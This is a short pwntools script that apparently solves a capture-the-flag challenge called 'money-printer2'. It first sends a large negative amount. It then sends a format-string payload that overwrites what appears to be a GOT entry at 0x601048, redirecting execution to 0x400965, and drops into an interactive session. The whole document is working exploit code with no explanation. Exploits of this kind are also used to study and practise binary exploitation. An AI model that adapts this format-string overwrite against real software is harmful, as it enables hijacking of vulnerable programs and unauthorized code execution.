from pwn import *

context.arch = 'amd64'
exe = ELF('./money-printer2')

io = exe.process()
#gdb.attach(io, api=True)

io.recvuntil(b'want?\n')
io.sendline(b'-100000000')

io.recvuntil(b'audience?\n')
payload = fmtstr_payload(8, {0x601048:0x0000000000400965})
io.sendline(payload)
io.interactive()